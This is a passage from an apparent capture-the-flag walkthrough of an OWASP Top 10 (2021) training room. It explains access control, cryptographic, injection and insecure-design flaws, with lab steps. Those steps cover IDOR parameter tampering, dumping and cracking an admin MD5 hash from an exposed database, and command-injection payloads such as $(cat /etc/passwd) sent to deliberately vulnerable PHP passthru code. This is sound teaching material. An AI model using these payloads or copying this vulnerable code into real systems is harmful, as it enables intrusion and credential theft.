        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    OWASP Top 10 - 2021
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#task-1-introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Task 1 - Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-2-accessing-machines" class="md-nav__link">
    <span class="md-ellipsis">
      Task 2 - Accessing Machines
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-3-broken-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      Task 3 - Broken Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-4-broken-access-control-idor-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 4 - Broken Access Control (IDOR Challenge)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-5-cryptographic-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 5 - Cryptographic Failures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 5 - Cryptographic Failures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prevention-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Prevention Methodology
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-6-cryptographic-failures-supporting-material-1" class="md-nav__link">
    <span class="md-ellipsis">
      Task 6 - Cryptographic Failures (Supporting Material 1)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-7-cryptographic-failures-supporting-material-2" class="md-nav__link">
    <span class="md-ellipsis">
      Task 7 - Cryptographic Failures (Supporting Material 2)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-8-cryptographic-failure-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 8 - Cryptographic Failure (Challenge)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-9-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Task 9 - Injection
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-10-command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Task 10 - Command Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 10 - Command Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#code-example" class="md-nav__link">
    <span class="md-ellipsis">
      Code Example
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting Command Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-11-insecure-design" class="md-nav__link">
    <span class="md-ellipsis">
      Task 11 - Insecure Design
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-12-security-misconfiguration" class="md-nav__link">
    <span class="md-ellipsis">
      Task 12 - Security Misconfiguration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-13-vulnerable-and-outdated-components" class="md-nav__link">
    <span class="md-ellipsis">
      Task 13 - Vulnerable and Outdated Components
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-14-vulnerable-and-outdated-components-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Task 14 - Vulnerable and Outdated Components - Exploits
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-15-vulnerable-and-outdated-components-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Task 15 - Vulnerable and Outdated Components - Lab
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-16-identification-and-authentication-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 16 - Identification and Authentication Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-17-identification-and-authentication-failures-practical" class="md-nav__link">
    <span class="md-ellipsis">
      Task 17 - Identification and Authentication Failures Practical
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-18-software-and-data-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 18 - Software and Data Integrity Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-19-software-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 19 - Software Integrity Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-20-data-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 20 - Data Integrity Failures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 20 - Data Integrity Failures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jwt-and-the-none-algorithm" class="md-nav__link">
    <span class="md-ellipsis">
      JWT and the None Algorithm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-21-security-logging-and-monitoring" class="md-nav__link">
    <span class="md-ellipsis">
      Task 21 - Security Logging and Monitoring
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-22-server-side-request-forgery-ssrf" class="md-nav__link">
    <span class="md-ellipsis">
      Task 22 - Server-Side Request Forgery (SSRF)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 22 - Server-Side Request Forgery (SSRF)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#going-the-extra-mile" class="md-nav__link">
    <span class="md-ellipsis">
      Going the Extra Mile
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../picklerick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pickle Rick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlinjectionlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection Lab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../steelmountain/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Steel Mountain
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../subdomainenumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomain Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../traverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traverse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../uploadvulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Upload Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnversity/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnversity
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../whattheshell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    What the Shell?
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#task-1-introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Task 1 - Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-2-accessing-machines" class="md-nav__link">
    <span class="md-ellipsis">
      Task 2 - Accessing Machines
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-3-broken-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      Task 3 - Broken Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-4-broken-access-control-idor-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 4 - Broken Access Control (IDOR Challenge)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-5-cryptographic-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 5 - Cryptographic Failures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 5 - Cryptographic Failures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prevention-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Prevention Methodology
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-6-cryptographic-failures-supporting-material-1" class="md-nav__link">
    <span class="md-ellipsis">
      Task 6 - Cryptographic Failures (Supporting Material 1)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-7-cryptographic-failures-supporting-material-2" class="md-nav__link">
    <span class="md-ellipsis">
      Task 7 - Cryptographic Failures (Supporting Material 2)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-8-cryptographic-failure-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 8 - Cryptographic Failure (Challenge)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-9-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Task 9 - Injection
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-10-command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Task 10 - Command Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 10 - Command Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#code-example" class="md-nav__link">
    <span class="md-ellipsis">
      Code Example
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting Command Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-11-insecure-design" class="md-nav__link">
    <span class="md-ellipsis">
      Task 11 - Insecure Design
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-12-security-misconfiguration" class="md-nav__link">
    <span class="md-ellipsis">
      Task 12 - Security Misconfiguration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-13-vulnerable-and-outdated-components" class="md-nav__link">
    <span class="md-ellipsis">
      Task 13 - Vulnerable and Outdated Components
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-14-vulnerable-and-outdated-components-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      Task 14 - Vulnerable and Outdated Components - Exploits
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-15-vulnerable-and-outdated-components-lab" class="md-nav__link">
    <span class="md-ellipsis">
      Task 15 - Vulnerable and Outdated Components - Lab
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-16-identification-and-authentication-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 16 - Identification and Authentication Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-17-identification-and-authentication-failures-practical" class="md-nav__link">
    <span class="md-ellipsis">
      Task 17 - Identification and Authentication Failures Practical
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-18-software-and-data-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 18 - Software and Data Integrity Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-19-software-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 19 - Software Integrity Failures
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-20-data-integrity-failures" class="md-nav__link">
    <span class="md-ellipsis">
      Task 20 - Data Integrity Failures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 20 - Data Integrity Failures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jwt-and-the-none-algorithm" class="md-nav__link">
    <span class="md-ellipsis">
      JWT and the None Algorithm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-21-security-logging-and-monitoring" class="md-nav__link">
    <span class="md-ellipsis">
      Task 21 - Security Logging and Monitoring
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-22-server-side-request-forgery-ssrf" class="md-nav__link">
    <span class="md-ellipsis">
      Task 22 - Server-Side Request Forgery (SSRF)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 22 - Server-Side Request Forgery (SSRF)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#going-the-extra-mile" class="md-nav__link">
    <span class="md-ellipsis">
      Going the Extra Mile
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>OWASP Top 10 - 2021</h1>

<h2 id="task-1-introduction">Task 1 - Introduction<a class="headerlink" href="#task-1-introduction" title="Permanent link">&para;</a></h2>
<p>This room covers topics related to OWASP Top 10 vulnerabilities (updated 2021). The material covered includes details on the vulnerabilities, how they occur, and methodologies to exploit them. Specific topics covered are as follows:
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging &amp; Monitoring Failures
10. Server-Side Request Forgery (SSRF)</p>
<p>Additional information regarding OWASP Top 10 project can be found at <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>.</p>
<h2 id="task-2-accessing-machines">Task 2 - Accessing Machines<a class="headerlink" href="#task-2-accessing-machines" title="Permanent link">&para;</a></h2>
<p>This task contains instructions on accessing target vulnerable machines required for the remainder of the tasks.</p>
<h2 id="task-3-broken-access-control">Task 3 - Broken Access Control<a class="headerlink" href="#task-3-broken-access-control" title="Permanent link">&para;</a></h2>
<p>Access control is intended to enforce policy such that users cannot act outside their intended permissions. Broken access control allows attackers to bypass authorization, allowing them to view, modify, or delete sensitive data or perform tasks which should be restricted to them.</p>
<p>Common access control vulnerabilities include:
- Violation of the principle of least privilege or deny by default. Access should only be granted for particular capabilities, roles, or users.
- Bypass of access control checks and measures by modifying the URL (parameter tampering or force browsing) or HTML page, internal application state, or by modifying API requests.
- Permitting viewing or editing of other users' account by providing its unique identifier (IDOR).
- Accessing APIs with missing access controls for POST, PUT and DELETE.
- Allow low-privileged user to act as admin or higher privileged user without being logged in (privilege escalation).
- Metadata manipulation such as replaying or tampering with JSON Web Tokens (JWT).
- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.</p>
<p>The following are several methods which could be employed to prevent vulnerabilities arising from broken access control:
- Deny resources by default.
- Implement access control mechanisms once. These mechanisms should be reused throughout the application.
- Minimize Cross-Origin Resource Sharing (CORS) usage.
- Enforce record ownership rather than accepting that the user can create, read, update, or delete any record.
- Enforce unique application business limit requirements via domain models.
- Disable web server directory listing and ensure file metadata and backup files are not present within web root.
- Log access control failures and alert admins when appropriate.
- Rate limit API and controller access to minimize harm from automated attacks.
- Stateful session identifiers should be invalidated on the server after logout. For example, JWT should be short-lived to minimize the attack window. If longer-lived JWT is required, follow the OAUTH standards to revoke access.</p>
<h2 id="task-4-broken-access-control-idor-challenge">Task 4 - Broken Access Control (IDOR Challenge)<a class="headerlink" href="#task-4-broken-access-control-idor-challenge" title="Permanent link">&para;</a></h2>
<p>Insecure Direct Object Reference (IDOR) is a type of an access control vulnerability that allows a user to access resources they wouldn't normally be able to see via the use of a unique identifier without authorization checks.</p>
<p>These types of vulnerabilities typically occur when a developer exposes a direct object reference (ie: a unique identifier) that is associated with a specific resource or object within the server.</p>
<p>Let's look at a simple example. The task provides us with a simple web application which, after correctly authenticating ourselves, we are presented with a list of things we need to buy from a store.</p>
<p><img alt="IDOR User Account" src="../../../assets/images/thm/owasptop10_2021/01-idor_user.png" /></p>
<p>If we look at the URL, we notice that application exposes the direct object reference through the <em>note_id</em> parameter which points to specific accounts.</p>
<p><img alt="IDOR id Parameter" src="../../../assets/images/thm/owasptop10_2021/02-idor_id.png" /></p>
<p>By altering the <em>note_id</em> parameter, we are able to access information from other accounts. This is due to the web application not checking if the logged-in user owns or has permissions to access the referenced account.</p>
<p>By modifying the <em>note_id</em> parameter to have the value <code>0</code> (ie: <code>note_id=0</code>), we can access the admin's account which contains the flag needed for this task.</p>
<p><img alt="IDOR Flag" src="../../../assets/images/thm/owasptop10_2021/03-idor_flag.png" /></p>
<p>Note that direct object references aren't necessarily a problem in themselves but rather issues arise from lack of authentication and validation controls implemented by developers.</p>
<h2 id="task-5-cryptographic-failures">Task 5 - Cryptographic Failures<a class="headerlink" href="#task-5-cryptographic-failures" title="Permanent link">&para;</a></h2>
<p>A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Cryptographic failures often result in web applications accidentally divulging sensitive data.</p>
<h4 id="prevention-methodology">Prevention Methodology<a class="headerlink" href="#prevention-methodology" title="Permanent link">&para;</a></h4>
<p>The following are several methods which could be employed to prevent vulnerabilities arising from cryptographic failures:
- Classify data processed, stored, or transmitted by an application in terms of sensitivity as required by privacy laws, regulatory requirements, or business needs.
- Do not store sensitive data unnecessarily.
- Encrypt all sensitive data at rest.
- Ensure up-to-date and strong standard algorithms, protocols, and keys are in place with proper key management implementation.
- Encrypt all data in transit with secure protocols.
- Disable caching for response that contain sensitive data.
- Apply required security controls as per the data classification.
- Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.
- Store passwords using strong adaptive and salted hashing functions.
- Always use authenticated encryption instead of just encryption.</p>
<h2 id="task-6-cryptographic-failures-supporting-material-1">Task 6 - Cryptographic Failures (Supporting Material 1)<a class="headerlink" href="#task-6-cryptographic-failures-supporting-material-1" title="Permanent link">&para;</a></h2>
<p>The most common way to store a large amount of data in a format easily accessible from many locations is in a database. Database engines usually follow the Structured Query Language (SQL) syntax.</p>
<p>In a production environment, it is common to have databases set up on dedicated servers running a database service such as MySQL or MariaDB. It is also possible that databases can be stored as files (or flat-file databases) on a local hard-disk. Flat-file databases are much easier than setting up an entire database server. The most common (and simplest) format of a flat-file database is an SQLite database.</p>
<p>In our scenario, the developer has stored an SQLite flat-file database in the root directory of the website. As a result, we are able to download and query the database file on our local machine with full access to everything in the database. Before we look at the challenge in subsequent tasks, let's review the syntax required to query an SQLite database. For our purposes, we will be using a utility called <em>sqlite3</em>.</p>
<p>To access an SQLite database, we would use the <code>sqlite3 &lt;database-name&gt;</code> command. </p>
<p>We can then list the tables in the database using the <code>.tables</code> command.</p>
<p>We can get column in the table by using the <code>PRAGMA table_info(&lt;table-name&gt;);</code> command.</p>
<p>Finally, we can dump the data from the table using the <code>SELECT * FROM &lt;table-name&gt;;</code> command.</p>
<h2 id="task-7-cryptographic-failures-supporting-material-2">Task 7 - Cryptographic Failures (Supporting Material 2)<a class="headerlink" href="#task-7-cryptographic-failures-supporting-material-2" title="Permanent link">&para;</a></h2>
<p>Sensitive data in databases is often stored as hashes. Hashes can be easily cracked if the developer uses a weak hashing algorithm. There are many tools which could be employed to crack hashes such as <em>John the Ripper</em> or <em>Hashcat</em> but for weak and vulnerable hashes such as MD5 hashes, we can use an online tool called <a href="https://crackstation.net/">Crackstation</a>.</p>
<h2 id="task-8-cryptographic-failure-challenge">Task 8 - Cryptographic Failure (Challenge)<a class="headerlink" href="#task-8-cryptographic-failure-challenge" title="Permanent link">&para;</a></h2>
<p>Let's put what we have learned so far into practice.</p>
<p>Navigating the the provided website and looking at the source-page, we find the existence of an <code>/assets</code> directory.</p>
<p><img alt="Asset Directory" src="../../../assets/images/thm/owasptop10_2021/04-crypto_dir.png" /></p>
<p>Navigating to the directory, we find the <em>webapp.db</em> database file which we can download.</p>
<p><img alt="Download Database File" src="../../../assets/images/thm/owasptop10_2021/06-crypto_download.png" /></p>
<p>Using the <em>file</em> command, we can verify that the file is an SQLite database type.</p>
<p><img alt="File" src="../../../assets/images/thm/owasptop10_2021/07-crypto_file.png" /></p>
<p>We can access the SQLite database file using the <em>sqlite3</em> utility and enumerate the tables and columns.</p>
<p><img alt="Database Enumeration" src="../../../assets/images/thm/owasptop10_2021/08-crypto_enum.png" /></p>
<p>Let's dump all the data contained in the <em>users</em> table.</p>
<p><img alt="Data Dump" src="../../../assets/images/thm/owasptop10_2021/09-crypto_dump.png" /></p>
<p>We can see a row for the admin user in the data dump above <code>admin:6eea9b7ef19179a06954edd0f6c05ceb</code>.</p>
<p>Using <em>Crackstation</em> to crack the admin user's hash we find the password: <code>admin:qwertyuiop</code></p>
<p><img alt="Admin Password" src="../../../assets/images/thm/owasptop10_2021/10-Crypto_pass.png" /></p>
<p>Using the credentials above, we can log-in as the admin user and retrieve the flag from the website.</p>
<p><img alt="Crytpo Flag" src="../../../assets/images/thm/owasptop10_2021/11-crypto_flag.png" /></p>
<h2 id="task-9-injection">Task 9 - Injection<a class="headerlink" href="#task-9-injection" title="Permanent link">&para;</a></h2>
<p>Injection flaws are some of the most common vulnerabilities in applications today. Injection vulnerabilities occur when the application interprets user-controlled input as a valid command or parameter. Injection attacks depend on the underlying technology implemented in the application. SQL Injection (SQLi) and Command Injection are the two most common examples.
- <strong>SQL Injection</strong> occurs when user-controlled input is passed to SQL queries. Without input sanitation, an attacker can pass in SQL queries to manipulate the output of such queries.
- <strong>Command Injection</strong> occurs when user input is passed to system commands. An attacker can execute arbitrary system commands on application servers, potentially allowing them to access sensitive data.</p>
<p>An application is vulnerable to injection attack when:
- User-supplied data is not validated, filtered, or sanitized by the application.
- Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.
- Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.
- Hostile data is directly used or concatenated.</p>
<p>Preventing injection requires keeping data separate from commands and queries:
- The preferred option is to use safe API which avoids using the interpreter entirely.
- Use positive server-side input validation.
- For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.
- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</p>
<h2 id="task-10-command-injection">Task 10 - Command Injection<a class="headerlink" href="#task-10-command-injection" title="Permanent link">&para;</a></h2>
<p>Command injection occurs when server-side code (such as PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.</p>
<h4 id="code-example">Code Example<a class="headerlink" href="#code-example" title="Permanent link">&para;</a></h4>
<p>Consider a scenario where a company (MooCorp) has started developing a web-based application for cow ASCII art with customizable text. The developers utilized the <em>cowsay</em> utility in Linux with a code wrapper calls the utility from the operating system's console and sends back its contents to the website. Let's look at the code used for this app.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;mooing&quot;</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>        <span class="nv">$mooing</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;mooing&quot;</span><span class="p">];</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>        <span class="nv">$cow</span> <span class="o">=</span> <span class="s1">&#39;default&#39;</span><span class="p">;</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cow&quot;</span><span class="p">]))</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>            <span class="nv">$cow</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cow&quot;</span><span class="p">];</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;perl /usr/bin/cowsay -f </span><span class="si">$cow</span><span class="s2"> </span><span class="si">$mooing</span><span class="s2">&quot;</span><span class="p">);</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="p">}</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="cp">?&gt;</span>
</code></pre></div>
The above snippet of code does the following:
1. Check if the parameter "mooing" is set. If it is, the variable <code>$mooing</code> gets assigned the value of what was passed into the input field.
2. Check if the parameter "cow" is set. If it is, the variable <code>$cow</code> gets what was passed through the parameter.
3. The program executes the function <code>passthru("perl /usr/bin/cowsay -f $cow $mooing");</code>. The <em>passthru</em> function simply executes a command in the operating system's console and sends the output back to the user's browser. The command is formed by concatenating the <code>$cow</code> and <code>$mooing</code> variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks.</p>
<h4 id="exploiting-command-injection">Exploiting Command Injection<a class="headerlink" href="#exploiting-command-injection" title="Permanent link">&para;</a></h4>
<p>Now that we know how the application works, we can take advantage of a Bash feature called <em>inline commands</em> to abuse the <em>cowsay</em> server and execute any arbitrary command we want. Bash allows users to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject command within the <em>cowsay</em> server to get it executed.</p>
<p>To execute inline commands, we need to enclose them in the following format: <code>$(your_command_here)</code></p>
<p>If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example which runs <code>whoami</code> as an inline command inside the <code>echo</code> command.</p>
<p><img alt="Inline Command" src="../../../assets/images/thm/owasptop10_2021/12-inject_inline.png" /></p>
<p>Let's look at the <em>cowsay</em> service by navigating to the provided URL. We can begin off by listing all the files in the root directory of the web server using the <code>$ls -la</code> command.</p>
<p><img alt="Inject ls" src="../../../assets/images/thm/owasptop10_2021/13-inject_ls.png" /></p>
<p><img alt="Inject ls Result" src="../../../assets/images/thm/owasptop10_2021/14-inject_ls_result.png" /></p>
<p>We can see that there are zero non-root/non-service/non-daemon users on the system using the <code>$(cat /etc/passwd)</code> command and going through all the users configured on the system.</p>
<p>To determine what user the web application is running as, we can use the <code>$(whoami)</code> command.</p>
<p><img alt="Inject whoami" src="../../../assets/images/thm/owasptop10_2021/15-inject_whoami.png" /></p>
<p>We can determine the default shell <code>/sbin/nologin</code> for the <em>apache</em> user by looking at the output of <code>$(cat /etc/passwd)</code>.</p>
<p><img alt="Default Shell" src="../../../assets/images/thm/owasptop10_2021/16-inject_shell.png" /></p>
<p>The Linux version can be determined by looking at the contents of <code>/etc/os-release</code>.</p>
<p><img alt="OS Version" src="../../../assets/images/thm/owasptop10_2021/17-inject_ver.png" /></p>
<h2 id="task-11-insecure-design">Task 11 - Insecure Design<a class="headerlink" href="#task-11-insecure-design" title="Permanent link">&para;</a></h2>
<p>Insecure design refers to vulnerabilities which are inherent to the application's architecture. These vulnerabilities are not related to bad implementation or configurations but instead the architecture of the application as a whole is flawed. Vulnerabilities related to insecure design often arise due to an improper threat modelling which is made during the planning phase of the application and propagates all the way up to the final application. Other times, vulnerabilities may be introduced due to "shortcuts" used by developers during the coding and testing process.</p>
<p>Since insecure design vulnerabilities are introduced early in the development process, resolving them often requires refactoring/rebuilding the vulnerable part of the application. The best approach to avoiding such vulnerabilities is to perform threat modelling at the early stages of the development cycle. The following are a few tips on prevention:
- Establish and use a secure development lifecycle.
- Establish and use a library of secure design patterns.
- Use threat modelling for critical authentication, access control, and key flows.
- Integrate security language and controls into user stories.
- Integrate plausibility checks at each tier of the application (frontend and backend).
- Write unit and integration tests to validate that all critical flows are resistant to threat model.
- Compile use-cases and misuse-cases for each tier of the application.
- Segregate tier layers on the system and network layers depending on exposure and protection needed.
- Segregate tenants by design throughout all tiers.
- Limit resource consumption by user or service.</p>
<p>Let's look at a practical example provided in this task. We are provided a URL will allows us to log into a user account. We are told that the application has a design flaw in its password reset mechanism. Let's figure out the weakness in the proposed design and abuse it to get our flag.</p>
<p>Let's begin by attempting to reset the user's account password.</p>
